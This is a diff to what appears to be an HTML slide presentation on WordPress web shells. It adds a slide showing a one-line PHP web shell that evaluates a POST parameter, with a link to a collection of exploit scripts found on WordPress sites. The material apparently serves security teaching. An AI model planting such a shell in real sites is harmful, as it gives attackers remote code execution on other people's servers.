@@ -392,6 +392,11 @@ function webshell() {
 add_action('wp_head', 'webshell');
 					</code></pre>
 					<small><a href="https://www.youtube.com/watch?v=XHShse4z6ds">Simple Wordpress Web Shell Tutorial - Youtube</a></small>
+
+					<pre><code data-trim>
+					<?php @eval($_POST["aabbcc"]) ?>
+					</code></pre>
+					<small><a href="https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/">https://github.com/mattiasgeniar/php-exploit-scripts/blob/master/found_on_wordpress/</a></small>
 				</section>
 
 				<section>
